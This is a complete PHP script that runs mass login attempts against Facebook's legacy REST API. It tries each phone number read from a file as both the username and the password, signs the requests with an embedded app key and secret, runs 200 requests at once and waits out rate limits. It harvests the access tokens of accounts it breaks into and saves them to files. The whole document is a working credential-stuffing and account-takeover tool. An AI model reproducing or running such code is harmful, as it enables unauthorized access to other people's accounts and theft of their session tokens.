<?php
error_reporting(0);
$bigArray = array();
$myurl = array();
function get_sig($email,$password){		
	$data['api_key'] = '882a8490361da98702bf97a021ddc14d';
	$data['method'] = "auth.login";
	$data['credentials_type'] = 'password';
	$data['email'] = $email;
	$data['password'] = $password;
	$data['format'] = "JSON";
	$data['v'] = '1.0';				
	ksort($data);					
	$args = '';									
	foreach ($data as $key => $value){
		$args .= $key.'='.$value;
	}
							
	$data['sig'] = md5($args.'62f8ce9f74b12f84c123cc23437a4a32');
    return $data["sig"];
}
function getphone(){
	$number[1] = array("089","099","097","082","065","095","091");
	$number[2] = $number[1][array_rand($number[1])];
	$number[3] = $number[2].substr(str_shuffle("0123456789"),0,7);
	return $number[3];
}



$phonearray = file("phone.txt");



	foreach ($phonearray as $phone) {
		$bigArray = 'https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email='.urlencode($phone).'&format=JSON&method=auth.login&password='.urlencode($phone).'&v=1.0&sig='.get_sig($phone,$phone);
		array_push($myurl,$bigArray);
	}
	require("RollingCurl.php");
	$rc = new RollingCurl("request_callback");
	$rc->window_size = 200;
	
	foreach ($myurl as $url) {
		$request = new RollingCurlRequest($url);
		$rc->add($request);
		flush();
	}
	$rc->execute();

	function request_callback($response, $info) {
		global $id;
		$token = json_decode($response, true);
		if($token['access_token'] != ""){
			$Fopen = fopen("token.txt", 'a');
			fwrite($Fopen, "".$token['access_token']."\n");
			fclose($Fopen);
			$Fopen2 = fopen("log.txt", 'a');
			fwrite($Fopen2, "".$info['url']."\n");
			fclose($Fopen2);
			$Fopen3 = fopen("getphonetoken.txt", 'a');
			fwrite($Fopen3, "".$token['access_token']."\n");
			fclose($Fopen3);
			echo "=====================================\n";
			echo "STATUS : SUCCESS\n";
			echo "TOKEN : ".$token['access_token']."\n";
			echo "=====================================\n";
		}else{
			if($token['error_msg'] == 'Calls to this api have exceeded the rate limit. (613)'){
				echo "=====================================\n";
				echo "Sleep 300 sec  ".date("h:i:sa")."  \n";
				echo "=====================================\n";
				sleep(300);
			}else{
				echo "=====================================\n";
				echo "STATUS : ERROR\n";
				echo "PHONE : ".$token['request_args'][2]['value']."";
				echo "MSG : ".$token['error_msg']."\n";
				echo "=====================================\n";
			}
		}
	}
?>